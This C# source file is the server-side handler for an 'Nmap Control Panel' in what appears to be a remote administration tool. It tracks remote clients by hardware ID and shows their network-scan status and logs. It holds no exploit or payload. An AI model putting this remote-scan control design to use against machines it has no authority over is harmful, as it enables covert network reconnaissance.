using System.Drawing;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerNmap
{
	public static void Read(Clients client, object[] objects)
	{
		if (objects == null || objects.Length < 2 || !(objects[1] is string))
		{
			return;
		}
		switch ((string)objects[1])
		{
		case "Connect":
		{
			if (objects.Length < 3 || !(objects[2] is string))
			{
				break;
			}
			string hwid = SecurityHelper.SanitizeHwid((string)objects[2]);
			FormNmap form = (FormNmap)Application.OpenForms["Nmap:" + hwid];
			if (form == null)
			{
				client.Disconnect();
				break;
			}
			form.Invoke((MethodInvoker)delegate
			{
				form.Text = "Nmap Control Panel [" + hwid + "]";
				form.client = client;
			});
			client.Tag = form;
			client.Hwid = hwid;
			break;
		}
		case "Status":
			if (client.Tag != null)
			{
				FormNmap obj3 = (FormNmap)client.Tag;
				bool isInstalled = (bool)objects[2];
				string version = objects[3] as string;
				obj3.UpdateStatus(isInstalled, version);
				obj3.AppendLog(isInstalled ? ("Nmap status: Installed (" + version + ")") : "Nmap status: Not Found", isInstalled ? Color.Green : Color.Red);
			}
			break;
		case "Log":
			if (client.Tag != null)
			{
				FormNmap obj2 = (FormNmap)client.Tag;
				string log = objects[2] as string;
				Color color = Color.White;
				bool showTimestamp = true;
				if (log.Contains("[ERROR]"))
				{
					color = Color.Red;
				}
				else if (log.Contains("[INFO]"))
				{
					color = Color.LightBlue;
				}
				else if (log.Contains("[SUCCESS]"))
				{
					color = Color.Green;
				}
				else
				{
					showTimestamp = false;
				}
				obj2.AppendLog(log, color, showTimestamp);
			}
			break;
		case "Finished":
			if (client.Tag != null)
			{
				FormNmap obj = (FormNmap)client.Tag;
				obj.OnScanFinished();
				obj.AppendLog("Scan finished.", Color.Yellow);
			}
			break;
		}
	}
}
